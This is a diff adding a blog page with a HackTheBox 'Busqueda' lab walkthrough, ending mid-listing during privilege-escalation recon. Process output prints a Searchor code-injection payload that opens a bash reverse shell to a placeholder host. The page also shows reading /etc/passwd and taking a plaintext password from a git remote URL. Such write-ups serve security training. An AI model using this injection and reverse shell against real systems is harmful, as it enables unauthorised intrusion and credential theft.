@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>HTB Busqueda Machine Writeup | D4rkNebula Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="Walkthrough for Busqueda (easy linux machine) in HackTheBox">
+<meta name="author" content="D4rkNebula">
+<link rel="canonical" href="https://me.dgidc.ir/b/posts/2/">
+<link crossorigin="anonymous" href="/b/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/b/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://me.dgidc.ir/b/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://me.dgidc.ir/b/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://me.dgidc.ir/b/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://me.dgidc.ir/b/apple-touch-icon.png">
+<link rel="mask-icon" href="https://me.dgidc.ir/b/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="HTB Busqueda Machine Writeup" />
+<meta property="og:description" content="Walkthrough for Busqueda (easy linux machine) in HackTheBox" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://me.dgidc.ir/b/posts/2/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-06-18T08:21:17-04:00" />
+<meta property="article:modified_time" content="2023-06-18T08:21:17-04:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB Busqueda Machine Writeup"/>
+<meta name="twitter:description" content="Walkthrough for Busqueda (easy linux machine) in HackTheBox"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://me.dgidc.ir/b/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "HTB Busqueda Machine Writeup",
+      "item": "https://me.dgidc.ir/b/posts/2/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB Busqueda Machine Writeup",
+  "name": "HTB Busqueda Machine Writeup",
+  "description": "Walkthrough for Busqueda (easy linux machine) in HackTheBox",
+  "keywords": [
+    
+  ],
+  "articleBody": " When I started getting into cybersecurity and htb I had no idea where to begin, What to do and why enter commands that I found. So in this writeup as it’s an easy machine i’ll try to write a short part for each command to explain what does the command do, how did I figured out I should use this command, etc. So without any further waste of time lets get to it.\nUser Access Recon First step is obviously finding something to work on. It could be a web service, could be a open ftp, could be anything. So our first step is to run a port scan to find out which ports are open and work on them.\n┌──(d4rknebula㉿ur-home)-[~] └─$ rustscan -a 10.10.11.208 -r 0-65535 .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-' The Modern Day Port Scanner. ________________________________________ : https://discord.gg/GFrQsGy : : https://github.com/RustScan/RustScan : -------------------------------------- 😵 https://admin.tryhackme.com [~] The config file is expected to be at \"/home/d4rknebula/.rustscan.toml\" [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. Open 10.10.11.208:22 Open 10.10.11.208:80 [~] Starting Script(s) [\u003e] Script to be run Some(\"nmap -vvv -p {{port}} {{ip}}\") [~] Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-18 09:57 EDT Initiating Ping Scan at 09:57 Scanning 10.10.11.208 [2 ports] Completed Ping Scan at 09:57, 0.27s elapsed (1 total hosts) Initiating Connect Scan at 09:57 Scanning searcher.htb (10.10.11.208) [2 ports] Discovered open port 22/tcp on 10.10.11.208 Discovered open port 80/tcp on 10.10.11.208 Completed Connect Scan at 09:57, 0.26s elapsed (2 total ports) Nmap scan report for searcher.htb (10.10.11.208) Host is up, received syn-ack (0.26s latency). Scanned at 2023-06-18 09:57:17 EDT for 0s PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds I use rustscan instead of nmap because it’s so much faster and when it find the ports then it passes the ports to nmap for a completer scan on only those port.\nAnyway the output of port scan shows us that there is two ports open, 22 which is the ssh port and usually we don’t have to do anything with it in htb. And the 80 which is a web server so lets take a look at it.\n┌──(d4rknebula㉿ur-home)-[~] └─$ curl -vvv 10.10.11.208 * Trying 10.10.11.208:80... * Connected to 10.10.11.208 (10.10.11.208) port 80 (#0) \u003e GET / HTTP/1.1 \u003e Host: 10.10.11.208 \u003e User-Agent: curl/7.81.0 \u003e Accept: */* \u003e * Mark bundle as not supporting multiuse \u003c HTTP/1.1 302 Found \u003c Date: Sun, 18 Jun 2023 14:09:32 GMT \u003c Server: Apache/2.4.52 (Ubuntu) \u003c Location: http://searcher.htb/ \u003c Content-Length: 282 \u003c Content-Type: text/html; charset=iso-8859-1 \u003c \u003c!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"\u003e 302 Found Found The document has moved ",
+  "wordCount" : "1559",
+  "inLanguage": "en",
+  "datePublished": "2023-06-18T08:21:17-04:00",
+  "dateModified": "2023-06-18T08:21:17-04:00",
+  "author":{
+    "@type": "Person",
+    "name": "D4rkNebula"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://me.dgidc.ir/b/posts/2/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "D4rkNebula Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://me.dgidc.ir/b/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://me.dgidc.ir/b/" accesskey="h" title="D4rkNebula Blog (Alt + H)">D4rkNebula Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title">
+      HTB Busqueda Machine Writeup
+    </h1>
+    <div class="post-description">
+      Walkthrough for Busqueda (easy linux machine) in HackTheBox
+    </div>
+    <div class="post-meta"><span title='2023-06-18 08:21:17 -0400 EDT'>June 18, 2023</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;D4rkNebula
+
+</div>
+  </header> 
+  <div class="post-content">
+
+<img src="/b/images/Busqueda_hua459609ac9d50d72fdfa634f6aacd66e_354496_700x500_resize_box_3.png" alt="Busqueda Info Card">
+
+<p>When I started getting into cybersecurity and htb I had no idea where to begin, What to do and why enter commands that I found. So in this writeup as it&rsquo;s an easy machine i&rsquo;ll try to write a short part for each command to explain what does the command do, how did I figured out I should use this command, etc. So without any further waste of time lets get to it.</p>
+<h2 id="user-access">User Access<a hidden class="anchor" aria-hidden="true" href="#user-access">#</a></h2>
+<h3 id="recon">Recon<a hidden class="anchor" aria-hidden="true" href="#recon">#</a></h3>
+<p>First step is obviously finding something to work on. It could be a web service, could be a open ftp, could be anything. So our first step is to run a port scan to find out which ports are open and work on them.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>d4rknebula㉿ur-home<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ rustscan -a 10.10.11.208 -r 0-65535
+</span></span><span style="display:flex;"><span>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+</span></span><span style="display:flex;"><span>| <span style="color:#f92672">{}</span>  <span style="color:#f92672">}</span>| <span style="color:#f92672">{</span> <span style="color:#f92672">}</span> |<span style="color:#f92672">{</span> <span style="color:#f92672">{</span>__ <span style="color:#f92672">{</span>_   _<span style="color:#f92672">}{</span> <span style="color:#f92672">{</span>__  /  ___<span style="color:#f92672">}</span> / <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\ </span>|  <span style="color:#e6db74">`</span>| |
+</span></span><span style="display:flex;"><span>| .-. <span style="color:#ae81ff">\|</span> <span style="color:#f92672">{</span>_<span style="color:#f92672">}</span> |.-._<span style="color:#f92672">}</span> <span style="color:#f92672">}</span> | |  .-._<span style="color:#f92672">}</span> <span style="color:#f92672">}</span><span style="color:#ae81ff">\ </span>    <span style="color:#f92672">}</span>/  /<span style="color:#ae81ff">\ </span> <span style="color:#ae81ff">\|</span> |<span style="color:#ae81ff">\ </span> |
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39; `-&#39;</span><span style="color:#e6db74">`</span>-----<span style="color:#e6db74">&#39;`----&#39;</span>  <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;  `----&#39;</span>  <span style="color:#e6db74">`</span>---<span style="color:#e6db74">&#39; `-&#39;</span>  <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;`-&#39;</span> <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The Modern Day Port Scanner.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">________________________________________
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">: https://discord.gg/GFrQsGy           :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">: https://github.com/RustScan/RustScan :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> --------------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">😵 https://admin.tryhackme.com
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[~] The config file is expected to be at &#34;/home/d4rknebula/.rustscan.toml&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] Your file limit is very small, which negatively impacts RustScan&#39;</span>s speed. Use the Docker image, or up the Ulimit with <span style="color:#e6db74">&#39;--ulimit 5000&#39;</span>. 
+</span></span><span style="display:flex;"><span>Open 10.10.11.208:22
+</span></span><span style="display:flex;"><span>Open 10.10.11.208:80
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>~<span style="color:#f92672">]</span> Starting Script<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> Script to be run Some<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;nmap -vvv -p {{port}} {{ip}}&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>~<span style="color:#f92672">]</span> Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-06-18 09:57 EDT
+</span></span><span style="display:flex;"><span>Initiating Ping Scan at 09:57
+</span></span><span style="display:flex;"><span>Scanning 10.10.11.208 <span style="color:#f92672">[</span><span style="color:#ae81ff">2</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed Ping Scan at 09:57, 0.27s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating Connect Scan at 09:57
+</span></span><span style="display:flex;"><span>Scanning searcher.htb <span style="color:#f92672">(</span>10.10.11.208<span style="color:#f92672">)</span> <span style="color:#f92672">[</span><span style="color:#ae81ff">2</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.10.11.208
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.10.11.208
+</span></span><span style="display:flex;"><span>Completed Connect Scan at 09:57, 0.26s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">2</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> searcher.htb <span style="color:#f92672">(</span>10.10.11.208<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up, received syn-ack <span style="color:#f92672">(</span>0.26s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2023-06-18 09:57:17 EDT <span style="color:#66d9ef">for</span> 0s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.58 seconds
+</span></span></code></pre></div><p>I use <a href="https://github.com/RustScan/RustScan">rustscan</a> instead of nmap because it&rsquo;s so much faster and when it find the ports then it passes the ports to nmap for a completer scan on only those port.</p>
+<p>Anyway the output of port scan shows us that there is two ports open, 22 which is the ssh port and usually we don&rsquo;t have to do anything with it in htb. And the 80 which is a web server so lets take a look at it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>d4rknebula㉿ur-home<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl -vvv 10.10.11.208
+</span></span><span style="display:flex;"><span>*   Trying 10.10.11.208:80...
+</span></span><span style="display:flex;"><span>* Connected to 10.10.11.208 <span style="color:#f92672">(</span>10.10.11.208<span style="color:#f92672">)</span> port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
+</span></span><span style="display:flex;"><span>&gt; GET / HTTP/1.1
+</span></span><span style="display:flex;"><span>&gt; Host: 10.10.11.208
+</span></span><span style="display:flex;"><span>&gt; User-Agent: curl/7.81.0
+</span></span><span style="display:flex;"><span>&gt; Accept: */*
+</span></span><span style="display:flex;"><span>&gt; 
+</span></span><span style="display:flex;"><span>* Mark bundle as not supporting multiuse
+</span></span><span style="display:flex;"><span>&lt; HTTP/1.1 <span style="color:#ae81ff">302</span> Found
+</span></span><span style="display:flex;"><span>&lt; Date: Sun, <span style="color:#ae81ff">18</span> Jun <span style="color:#ae81ff">2023</span> 14:09:32 GMT
+</span></span><span style="display:flex;"><span>&lt; Server: Apache/2.4.52 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>&lt; Location: http://searcher.htb/
+</span></span><span style="display:flex;"><span>&lt; Content-Length: <span style="color:#ae81ff">282</span>
+</span></span><span style="display:flex;"><span>&lt; Content-Type: text/html; charset<span style="color:#f92672">=</span>iso-8859-1
+</span></span><span style="display:flex;"><span>&lt; 
+</span></span><span style="display:flex;"><span>&lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;html&gt;&lt;head&gt;
+</span></span><span style="display:flex;"><span>&lt;title&gt;302 Found&lt;/title&gt;
+</span></span><span style="display:flex;"><span>&lt;/head&gt;&lt;body&gt;
+</span></span><span style="display:flex;"><span>&lt;h1&gt;Found&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>&lt;p&gt;The document has moved &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://searcher.htb/&#34;</span>&gt;here&lt;/a&gt;.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>&lt;hr&gt;
+</span></span><span style="display:flex;"><span>&lt;address&gt;Apache/2.4.52 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span> Server at 10.10.11.208 Port 80&lt;/address&gt;
+</span></span><span style="display:flex;"><span>&lt;/body&gt;&lt;/html&gt;
+</span></span><span style="display:flex;"><span>* Connection <span style="color:#75715e">#0 to host 10.10.11.208 left intact</span>
+</span></span></code></pre></div><p>So it uses a domain name. Lets add it to our /etc/hosts file so we can take a look at the website.(add <code>10.10.11.208	searcher.htb</code> to your hosts file)</p>
+<p>And opening it in our browse, We&rsquo;ll see a website
+
+
+<img src="/b/images/busqueda-web_hu7e207314ce2618e40ef501b22ddce64d_381437_1700x900_resize_box_3.png" alt="web page">
+</p>
+<p>It&rsquo;s just a website that adds our input to the link for searching of those platforms.</p>
+<h3 id="initial-access">Initial access<a hidden class="anchor" aria-hidden="true" href="#initial-access">#</a></h3>
+<p>I&rsquo;ve found the vulnerability in the program myself but after finishing the box when I was reviewing it I found out that there was <code>Powered by Flask and Searchor 2.4.0</code> at the end of the website. searching for it&rsquo;s vulnerabilities gives us poc for code injection.
+<img loading="lazy" src="/b/images/busqueda-init-access.png" alt="Init Access"  title="Initial Access"  />
+
+Using a reverse shell we&rsquo;ll be able to get our initial access to the machine and we can get the user flag at <code>/home/svc/user.txt</code>.</p>
+<h2 id="root-access">Root Access<a hidden class="anchor" aria-hidden="true" href="#root-access">#</a></h2>
+<h3 id="recon-1">Recon<a hidden class="anchor" aria-hidden="true" href="#recon-1">#</a></h3>
+<p>Again, we need to find something and then use it or exploit it.</p>
+<p>Lets see what users exists.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.1$ cat /etc/passwd | egrep -v <span style="color:#e6db74">&#34;(nologin|false|sync)&#34;</span>
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>svc:x:1000:1000:svc:/home/svc:/bin/bash
+</span></span></code></pre></div><p>the egrep command removes the users that are system users or service users or etc that we don&rsquo;t need from output.</p>
+<p>looks like it&rsquo;s only the user that we are currently and the root user.</p>
+<p>lets see what files are in the user home directory.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.1$ ls -lah
+</span></span><span style="display:flex;"><span>drwxr-x--- <span style="color:#ae81ff">8</span> svc  svc  4.0K Jun <span style="color:#ae81ff">18</span> 14:57 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> root root 4.0K Dec <span style="color:#ae81ff">22</span> 18:56 ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Feb <span style="color:#ae81ff">20</span> 12:08 .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> svc  svc   <span style="color:#ae81ff">220</span> Jan  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2022</span> .bash_logout
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> svc  svc  3.7K Jan  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2022</span> .bashrc
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">2</span> svc  svc  4.0K Feb <span style="color:#ae81ff">28</span> 11:37 .cache
+</span></span><span style="display:flex;"><span>-rw-rw-r-- <span style="color:#ae81ff">1</span> svc  svc   <span style="color:#ae81ff">109</span> Jun <span style="color:#ae81ff">18</span> 13:27 .gitconfig
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">3</span> svc  svc  4.0K Jun <span style="color:#ae81ff">18</span> 13:20 .gnupg
+</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#ae81ff">5</span> svc  svc  4.0K Jun <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2022</span> .local
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Apr  <span style="color:#ae81ff">3</span> 08:58 .mysql_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> svc  svc   <span style="color:#ae81ff">807</span> Jan  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2022</span> .profile
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Feb <span style="color:#ae81ff">20</span> 14:08 .searchor-history.json -&gt; /dev/null
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">3</span> svc  svc  4.0K Jun <span style="color:#ae81ff">18</span> 13:13 snap
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> svc  svc  4.0K Jun <span style="color:#ae81ff">18</span> 14:11 .ssh
+</span></span><span style="display:flex;"><span>-rw-r----- <span style="color:#ae81ff">1</span> root svc    <span style="color:#ae81ff">33</span> Jun <span style="color:#ae81ff">18</span> 13:05 user.txt
+</span></span><span style="display:flex;"><span>bash-5.1$ cat .gitconfig
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>user<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>        email <span style="color:#f92672">=</span> cody@searcher.htb
+</span></span><span style="display:flex;"><span>        name <span style="color:#f92672">=</span> cody
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>core<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>        hooksPath <span style="color:#f92672">=</span> no-hooks
+</span></span></code></pre></div><p>Interesting. Lets keep searching. Cheking hosts file we&rsquo;ll find a <code>gitea</code> subdomain, add it to our hosts file in attacker machine and there is a gitea running on the subdomain, searching through that we&rsquo;ll find two users and nothing more. <code>cody</code> which looks like it&rsquo;s the user we have access and <code>administrator</code>.</p>
+<p>Next I checked the services running</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.1$ ps -aux
+</span></span><span style="display:flex;"><span>svc         <span style="color:#ae81ff">1719</span>  0.0  0.9 <span style="color:#ae81ff">261144</span> <span style="color:#ae81ff">19816</span> ?        Ssl  13:05   0:03 python3 /var/www/app/app.py
+</span></span><span style="display:flex;"><span>svc        <span style="color:#ae81ff">36488</span>  0.0  0.8  <span style="color:#ae81ff">23872</span> <span style="color:#ae81ff">16144</span> ?        S    15:10   0:00 /usr/bin/python3 /usr/local/bin/searchor search Accuweather <span style="color:#e6db74">&#39;+str(__import__(&#39;</span>os<span style="color:#e6db74">&#39;).system(&#39;</span>bash -c <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&#34;</span><span style="color:#e6db74">&#39;))+&#39;</span>
+</span></span><span style="display:flex;"><span>svc        <span style="color:#ae81ff">36489</span>  0.0  0.0   <span style="color:#ae81ff">2888</span>  <span style="color:#ae81ff">1000</span> ?        S    15:10   0:00 sh -c bash -c <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&#34;</span>
+</span></span><span style="display:flex;"><span>svc        <span style="color:#ae81ff">36617</span>  0.0  0.1  <span style="color:#ae81ff">10332</span>  <span style="color:#ae81ff">3840</span> ?        R    15:44   0:00 ps -aux
+</span></span></code></pre></div><p>lets check the python app that we got our initial access exploiting it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.1$ ls -lah 
+</span></span><span style="display:flex;"><span>total 20K
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> www-data www-data 4.0K Apr  <span style="color:#ae81ff">3</span> 14:32 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> root     root     4.0K Apr  <span style="color:#ae81ff">4</span> 16:02 ..
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> www-data www-data 1.1K Dec  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2022</span> app.py
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">8</span> www-data www-data 4.0K Jun <span style="color:#ae81ff">18</span> 13:05 .git
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> www-data www-data 4.0K Dec  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2022</span> templates
+</span></span></code></pre></div><p>checking inside <code>.git</code> folder and we&rsquo;ll find credential for the user <code>cody</code> in config file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.1$ cat .git/config
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>core<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>        repositoryformatversion <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        filemode <span style="color:#f92672">=</span> true
+</span></span><span style="display:flex;"><span>        bare <span style="color:#f92672">=</span> false
+</span></span><span style="display:flex;"><span>        logallrefupdates <span style="color:#f92672">=</span> true
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>remote <span style="color:#e6db74">&#34;origin&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>        url <span style="color:#f92672">=</span> http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+</span></span><span style="display:flex;"><span>        fetch <span style="color:#f92672">=</span> +refs/heads/*:refs/remotes/origin/*
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>branch <span style="color:#e6db74">&#34;main&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>        remote <span style="color:#f92672">=</span> origin
